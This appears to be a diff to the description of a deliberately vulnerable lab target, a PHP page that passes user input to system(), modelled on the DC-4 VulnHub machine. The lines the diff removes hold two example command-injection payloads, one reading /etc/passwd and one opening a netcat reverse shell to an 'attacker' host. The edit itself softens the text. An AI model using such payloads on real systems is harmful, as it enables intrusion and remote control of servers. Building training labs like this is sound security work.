@@ -7,13 +7,11 @@
 N/A (application vulnerability)
 
 ## Description
-A PHP script passes user input directly to system() without any sanitization using
-escapeshellarg() or escapeshellcmd(). An attacker can inject arbitrary OS commands
-(e.g., `; cat /etc/passwd` or `| nc attacker 4444 -e /bin/bash`).
+A PHP script passes user input directly to a system command call without any sanitization
+or shell escaping. An attacker can inject arbitrary OS commands.
 
 Mirrors the DC-4 VulnHub VM with web-based command execution.
 
 ## Affected Service
 - **Service:** Apache + PHP
 - **Port:** 80/TCP
-- **Configuration:** /var/www/html/cmd.php
